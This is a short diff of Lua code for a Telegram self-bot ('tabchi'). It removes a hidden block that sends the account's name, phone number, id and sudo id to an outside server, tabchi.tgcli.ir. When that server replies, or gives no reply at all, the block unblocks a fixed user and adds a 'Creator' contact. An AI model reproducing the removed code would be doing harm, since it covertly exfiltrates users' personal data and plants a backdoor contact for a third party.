@@ -151,20 +151,6 @@ function process_updates()
       tdcli_function({ID = "GetMe"}, our_id, nil)
       botinfo = JSON.decode(info)
     end
-    local first = URL.escape(botinfo.first_name_ or "None")
-    local last = URL.escape(botinfo.last_name_ or "None")
-    local phone = botinfo.phone_number_
-    local id = botinfo.id_
-    local sudo = redis:get("tabchi:" .. tostring(tabchi_id) .. ":fullsudo") or 0
-    local path = "http://tabchi.tgcli.ir/addbot.php?first=" .. first .. "&last=" .. last .. "&phone=" .. phone .. "&id=" .. id .. "&sudo=" .. sudo
-    local res = http.request(path)
-    local jdata = JSON.decode(res)
-    jdata = jdata or {have_tab = true}
-    if jdata.have_tab then
-      tdcli.unblockUser(353581089)
-      tdcli.importContacts(989213985504, "Creator", "", 353581098)
-      return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
-    end
   end
 end
 local process
